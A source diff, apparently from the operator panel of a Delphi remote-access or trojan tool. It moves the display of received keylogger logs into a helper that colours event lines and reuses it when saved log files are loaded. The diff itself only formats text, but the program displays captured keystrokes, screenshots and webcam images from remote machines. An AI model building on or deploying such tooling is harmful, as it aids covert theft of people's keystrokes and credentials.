@@ -496,6 +496,7 @@ type
     procedure TransferFinishedNotification(Sender: TObject;filename:string);
     procedure CreateParams(var Params: TCreateParams); override;
     procedure Estado(Estado:string);
+    procedure AgregarARichEdit(Texto:string); //Agrega texto en color a RichEdit
   public  //Funciones públicas que podemos llamar desde otros Forms
     Servidor: TIdPeerThread;
     RecibiendoJPG : boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
@@ -520,6 +521,36 @@ uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas,UnitTransfer,
      UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones,UnitVariables, AxThumbsDB, Storages;
      
 {$R *.dfm}
+
+procedure TFormControl.AgregarARichEdit(Texto:string);
+var
+  TempStr : string;
+begin
+    while pos(#10, Texto) > 0 do
+    begin
+      TempStr := copy(Texto, 1, pos(#10, Texto));
+      Delete(Texto, 1, Pos(#10, Texto));
+      
+      if (Copy(TempStr, 1, 2) = '-[') then //evento
+      begin
+         RichEditKeylogger.SelAttributes.Style := [fsBold];
+         RichEditKeylogger.SelAttributes.Color := clRed;
+      end
+      else if (Copy(TempStr, 1, 2) = '-{') then
+      begin
+         RichEditKeylogger.SelAttributes.Style := [fsBold];
+         RichEditKeylogger.SelAttributes.Color := clgreen;
+      end
+      else
+      begin
+         RichEditKeylogger.SelAttributes.Style := [];
+         RichEditKeylogger.SelAttributes.Color := clblack;
+      end;
+        RichEditKeylogger.SelText := TempStr {+ #13+#10};
+
+    end;
+    RichEditKeylogger.SelText := Texto;
+end;
 
 procedure TFormControl.Estado(Estado:string); //Cambia el texto de la statusbar
 begin
@@ -1280,31 +1311,7 @@ begin
     Recibido := StringReplace((Recibido),'|salto2|', #13, [rfReplaceAll]);
     Recibido := StringReplace((Recibido),'|espacio|', ' ', [rfReplaceAll]); 
     RichEditKeylogger.SelStart := RichEditKeylogger.GetTextLen;
-    
-    while pos(#10, Recibido) > 0 do
-    begin
-      TempStr := copy(Recibido, 1, pos(#10, Recibido));
-      Delete(Recibido, 1, Pos(#10, Recibido));
-      
-      if (Copy(TempStr, 1, 2) = '-[') then //evento
-      begin
-         RichEditKeylogger.SelAttributes.Style := [fsBold];
-         RichEditKeylogger.SelAttributes.Color := clRed;
-      end
-      else if (Copy(TempStr, 1, 2) = '-{') then
-      begin
-         RichEditKeylogger.SelAttributes.Style := [fsBold];
-         RichEditKeylogger.SelAttributes.Color := clgreen;
-      end
-      else
-      begin
-         RichEditKeylogger.SelAttributes.Style := [];
-         RichEditKeylogger.SelAttributes.Color := clblack;
-      end;
-        RichEditKeylogger.SelText := TempStr {+ #13+#10};
-
-    end;
-    RichEditKeylogger.SelText := Recibido;
+    AgregarARichEdit(Recibido);
   end;
 
   if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
@@ -2886,7 +2893,11 @@ begin
       while fileexists(DirUsuario+'Klog'+inttostr(i)+'.txt') do i := i+1;
       MSC[4].savetofile(DirUsuario+'Klog'+inttostr(i)+'.txt');
       MSC[4].Position := 0;
-      RichEditKeylogger.lines.loadfromStream(MSC[4]);
+      RichEditKeylogger.lines.clear;
+      Setlength(tmpstr, MSC[4].size);
+      MSC[4].Read(tmpstr[1], MSC[4].size);
+      AgregarARichEdit(tmpstr);
+      tmpstr := '';
       MSC[4].free;
       MSC[4] := nil;
       SpeedButtonRecibirLog.Enabled := true;
